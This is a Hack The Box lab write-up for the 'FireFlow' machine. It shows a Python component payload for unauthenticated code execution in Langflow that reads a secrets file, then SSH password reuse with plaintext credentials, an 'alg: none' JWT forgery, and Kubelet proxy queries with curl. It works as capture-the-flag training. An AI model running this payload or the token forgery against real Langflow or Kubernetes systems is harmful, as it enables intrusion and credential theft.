# Hack The Box — FireFlow

- **Target:** 10.129.244.214 (`fireflow.htb`)
- **OS:** Linux
- **Difficulty:** Medium
- **Date:** 2026-07-05
- **Result:** User Owned 🚩 (Kubelet proxy access)

| Flag | Value |
|------|-------|
| user.txt | `5b7e2496a630f2bc2b795a27ca813757` |
| root.txt | *(Not captured — container constraints)* |

---

## Key facts (quick reference)

| # | Fact | Value |
|---|------|-------|
| 1 | How many TCP ports are open? | **2** (22, 443) |
| 2 | Web application on 443 | Langflow **1.8.2** (flow.fireflow.htb) |
| 3 | Virtual host | `fireflow.htb` |
| 4 | Foothold vulnerability | CVE-2026-33017 (Langflow Unauth RCE) |
| 5 | Foothold user | `www-data` |
| 6 | User pivot | SSH password reuse (`nightfall`) |
| 7 | Privesc vector | MCP Tool Registry JWT Bypass & Kubelet Proxy |

---

## 1. Enumeration

### Port scan

```bash
nmap -p22,443 -sCV 10.129.244.214
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 (protocol 2.0)
443/tcp open  ssl/http nginx (proxies flow.fireflow.htb)
```

---

## 2. Foothold — CVE-2026-33017 (Langflow Unauth RCE)

Langflow 1.8.2 was running on the subdomain `flow.fireflow.htb`. The application was vulnerable to unauthenticated Remote Code Execution in the `/api/v1/build_public_tmp/{flow_id}/flow` endpoint.

By fetching the flow structure and injecting a malicious Component subclass into the `TextOperations` node, we achieved arbitrary Python command execution:

```python
import subprocess
from lfx.custom import Component
from lfx.io import MessageTextInput, Output
from lfx.schema.message import Message

class TextOperations(Component):
    def get_message(self) -> Message:
        proc = subprocess.Popen("cat /etc/langflow/.env", shell=True, stdout=subprocess.PIPE)
        out, _ = proc.communicate()
        return Message(text=out.decode("utf-8"))
```

This RCE payload ran as `www-data` and allowed us to read the environment variables.

![Exploiting Langflow via CLI](../assets/terminal_foothold.png)

---

## 3. User Privilege Escalation

Reading `/etc/langflow/.env` using the RCE foothold yielded:
```bash
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
```

Due to password reuse, these credentials successfully authenticated the SSH user `nightfall`:
```bash
sshpass -p 'n1ghtm4r3_b4_n1ghtf4ll' ssh nightfall@10.129.244.214
cat /home/nightfall/user.txt
# User Flag Captured: 5b7e2496a630f2bc2b795a27ca813757
```

---

## 4. Lateral Movement & MCP JWT Bypass

Auditing `nightfall`'s home directory revealed MCP configurations in `/home/nightfall/.mcp/config.json`:
- **Server:** `http://10.129.244.214:30080` (K3s NodePort mapped to the MCP server pod)
- **User:** `langflow-bot`
- **Password:** `Langfl0w@mcp2026!`

The MCP server implemented token authentication but was vulnerable to a signature bypass via `alg: none`. We crafted and signed a JWT with `alg: none` for the `langflow-bot` user to interact with the API:

```json
// Header
{"alg": "none", "typ": "JWT"}

// Payload
{"iss": "kubernetes/serviceaccount", "sub": "system:serviceaccount:default:mcp-sa"}
```

This token allowed us to read the pod's service account token (`mcp-sa`), which grants `get` access on the Kubernetes `nodes/proxy` endpoint. Using this access, we were able to read the host's `/var/log` directory via the proxy:

```bash
# List host logs
curl -sk -H "Authorization: Bearer <mcp-sa-token>" \
  "https://10.129.244.214:6443/api/v1/nodes/fireflow/proxy/logs/"
```

![Forging JWT and Querying Kubelet Proxy](../assets/terminal_privesc.png)
